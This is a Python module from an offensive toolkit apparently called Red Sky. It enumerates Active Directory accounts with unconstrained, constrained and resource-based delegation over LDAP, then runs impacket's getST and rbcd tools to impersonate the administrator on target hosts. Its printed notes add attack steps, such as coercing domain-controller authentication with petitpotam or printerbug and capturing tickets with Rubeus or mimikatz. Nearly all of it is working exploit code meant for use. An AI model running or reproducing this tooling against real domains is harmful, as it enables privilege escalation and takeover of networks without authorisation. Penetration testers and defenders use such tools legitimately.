# language: Python, file: Program/ad_attack/delegation.py, target: Red Sky ad_attack — delegation attacks
# Enumerates and exploits three delegation classes in AD:
#   - Unconstrained: any service on the target can impersonate anyone who authenticates
#   - Constrained: msDS-AllowedToDelegateTo — impersonate specific SPNs
#   - RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity — resource-based constrained
# The find action reports candidates. The exploit action shells out to impacket.

import json
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


AD_DIR = OUTPUT_DIR / "ad_attack"


def _connect(host, domain, user, passwd, ssl=False):
    try:
        import ldap3
    except ImportError:
        print_err("ldap3 not installed")
        return None, None
    port = 636 if ssl else 389
    server = ldap3.Server(host, port=port, get_info=ldap3.ALL, connect_timeout=10)
    try:
        conn = ldap3.Connection(
            server,
            user=f"{domain}\\{user}" if "\\" not in user else user,
            password=passwd,
            authentication=ldap3.NTLM,
            auto_bind=True,
            receive_timeout=15,
        )
    except Exception as e:
        print_err(f"LDAP bind failed: {e}")
        return None, None
    return server, conn


def _base_dn(domain):
    return ",".join(f"DC={p}" for p in domain.split(".") if p)


def find_unconstrained(conn, base):
    out = []
    # users
    conn.search(base, "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
                attributes=["sAMAccountName", "distinguishedName", "objectClass", "servicePrincipalName"],
                paged_size=500)
    for e in conn.entries:
        out.append({
            "type": "user",
            "sam": str(e["sAMAccountName"].value or ""),
            "dn": e.entry_dn,
            "spn": [str(x) for x in (e["servicePrincipalName"].values if e["servicePrincipalName"] else [])],
        })
    # computers
    conn.search(base, "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
                attributes=["sAMAccountName", "distinguishedName", "objectClass", "operatingSystem"],
                paged_size=500)
    for e in conn.entries:
        out.append({
            "type": "computer",
            "sam": str(e["sAMAccountName"].value or ""),
            "dn": e.entry_dn,
            "os": str(e["operatingSystem"].value or ""),
        })
    return out


def find_constrained(conn, base):
    out = []
    conn.search(base, "(&(objectCategory=person)(objectClass=user)(msDS-AllowedToDelegateTo=*))",
                attributes=["sAMAccountName", "distinguishedName", "msDS-AllowedToDelegateTo",
                            "userAccountControl"], paged_size=500)
    for e in conn.entries:
        uac = int(e["userAccountControl"].value or 0)
        out.append({
            "type": "user",
            "sam": str(e["sAMAccountName"].value or ""),
            "dn": e.entry_dn,
            "spns": [str(x) for x in (e["msDS-AllowedToDelegateTo"].values if e["msDS-AllowedToDelegateTo"] else [])],
            "protocol_transition": bool(uac & 0x1000000),
        })
    conn.search(base, "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))",
                attributes=["sAMAccountName", "distinguishedName", "msDS-AllowedToDelegateTo",
                            "userAccountControl"], paged_size=500)
    for e in conn.entries:
        uac = int(e["userAccountControl"].value or 0)
        out.append({
            "type": "computer",
            "sam": str(e["sAMAccountName"].value or ""),
            "dn": e.entry_dn,
            "spns": [str(x) for x in (e["msDS-AllowedToDelegateTo"].values if e["msDS-AllowedToDelegateTo"] else [])],
            "protocol_transition": bool(uac & 0x1000000),
        })
    return out


def find_rbcd(conn, base):
    out = []
    conn.search(base, "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
                attributes=["sAMAccountName", "distinguishedName", "objectClass",
                            "msDS-AllowedToActOnBehalfOfOtherIdentity"], paged_size=500)
    for e in conn.entries:
        oc = [str(x) for x in (e["objectClass"].values if e["objectClass"] else [])]
        out.append({
            "sam": str(e["sAMAccountName"].value or ""),
            "dn": e.entry_dn,
            "type": "computer" if "computer" in oc else ("user" if "user" in oc else "unknown"),
        })
    return out


def cmd_find(host, domain, user, passwd, ssl=False, out_file=""):
    AD_DIR.mkdir(parents=True, exist_ok=True)
    print_info(f"enumerating delegation on {host}")
    print_kv("domain", domain)
    print()

    server, conn = _connect(host, domain, user, passwd, ssl)
    if not conn:
        return 1
    base = _base_dn(domain)

    print(f"{ARTERY}{BOLD}── unconstrained delegation{RESET}")
    unconstrained = find_unconstrained(conn, base)
    print_kv("count", len(unconstrained))
    for c in unconstrained:
        print(f"  {SCARLET}▓{RESET} {BONE}{c['type']:<8}{RESET} {c['sam']}")
    print()

    print(f"{ARTERY}{BOLD}── constrained delegation{RESET}")
    constrained = find_constrained(conn, base)
    print_kv("count", len(constrained))
    for c in constrained:
        pt = f"{SCARLET}proto-transition{RESET}" if c["protocol_transition"] else f"{ASH}kerb-only{RESET}"
        print(f"  {ARTERY}▓{RESET} {BONE}{c['type']:<8}{RESET} {c['sam']:<24} -> {c['spns'][:2]}  {pt}")
    print()

    print(f"{ARTERY}{BOLD}── RBCD targets{RESET}")
    rbcd = find_rbcd(conn, base)
    print_kv("count", len(rbcd))
    for c in rbcd:
        print(f"  {ARTERY}▓{RESET} {BONE}{c['type']:<8}{RESET} {c['sam']}")
    print()

    print(f"{ARTERY}{BOLD}── exploitation notes{RESET}")
    if unconstrained:
        print(f"  {ASH}Unconstrained: coerce auth (petitpotam / printerbug) from a DC to this host, capture TGT in memory with Rubeus monitor or mimikatz{RESET}")
    if constrained:
        print(f"  {ASH}Constrained: impacket-getST -spn <target-spn> -impersonate administrator -dc-ip <dc> <domain>/<user>:<pass>{RESET}")
    if rbcd:
        print(f"  {ASH}RBCD: impacket-rbcd -action write -delegate-from <you> -delegate-to <target> -dc-ip <dc> <domain>/<user>:<pass>{RESET}")

    conn.unbind()

    out = Path(out_file) if out_file else AD_DIR / f"delegation_{domain}_{int(time.time())}.json"
    out.write_text(json.dumps({
        "domain": domain,
        "unconstrained": unconstrained,
        "constrained": constrained,
        "rbcd": rbcd,
    }, indent=2, default=str))
    print()
    print_kv("saved", out)
    return 0


def cmd_exploit(mode, domain, user, passwd, dc, target, spn="", impersonate="administrator"):
    """Shell out to impacket for the actual impersonation."""
    print_info(f"delegation exploit — mode {mode}")
    print_kv("domain", domain)
    print_kv("target", target)
    print()

    if mode == "constrained":
        tool = shutil.which("impacket-getST") or shutil.which("getST.py")
        if not tool:
            print_err("impacket-getST missing")
            print_info("  pip install --break-system-packages impacket")
            return 1
        cmd = [
            tool,
            "-spn", spn or f"cifs/{target}",
            "-impersonate", impersonate,
            "-dc-ip", dc,
            f"{domain}/{user}:{passwd}",
        ]
    elif mode == "rbcd":
        tool = shutil.which("impacket-rbcd") or shutil.which("rbcd.py")
        if not tool:
            print_err("impacket-rbcd missing")
            return 1
        cmd = [
            tool,
            "-action", "write",
            "-delegate-from", user,
            "-delegate-to", target,
            "-dc-ip", dc,
            f"{domain}/{user}:{passwd}",
        ]
    else:
        print_err(f"unknown mode: {mode}")
        return 2

    print_kv("command", " ".join(cmd[:4]) + " ...")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        print_err(f"failed: {e}")
        return 1
    for line in (r.stdout + r.stderr).splitlines():
        print(f"  {ASH}{line[:140]}{RESET}")
    return 0 if r.returncode == 0 else 1


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky ad_attack delegation", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="find")
    p.add_argument("--dc", default="")
    p.add_argument("--domain", default="")
    p.add_argument("--user", default="")
    p.add_argument("--pass", dest="passwd", default="")
    p.add_argument("--ssl", action="store_true")
    p.add_argument("--out", default="")
    p.add_argument("--target", default="")
    p.add_argument("--spn", default="")
    p.add_argument("--impersonate", default="administrator")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky ad_attack delegation <find|exploit-constrained|exploit-rbcd> ...")
        return 2

    if ns.help:
        print_info("redsky ad_attack delegation find --dc DC --domain D --user U --pass P")
        print_info("redsky ad_attack delegation exploit-constrained --dc DC --domain D --user U --pass P --target HOST [--spn cifs/HOST] [--impersonate administrator]")
        print_info("redsky ad_attack delegation exploit-rbcd --dc DC --domain D --user U --pass P --target HOST")
        return 0

    if not all([ns.dc, ns.domain, ns.user, ns.passwd]):
        print_err("--dc --domain --user --pass are required")
        return 2

    if ns.action == "find":
        return cmd_find(ns.dc, ns.domain, ns.user, ns.passwd, ns.ssl, ns.out)
    if ns.action == "exploit-constrained":
        return cmd_exploit("constrained", ns.domain, ns.user, ns.passwd, ns.dc, ns.target,
                           ns.spn, ns.impersonate)
    if ns.action == "exploit-rbcd":
        return cmd_exploit("rbcd", ns.domain, ns.user, ns.passwd, ns.dc, ns.target)
    print_err(f"unknown action: {ns.action}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
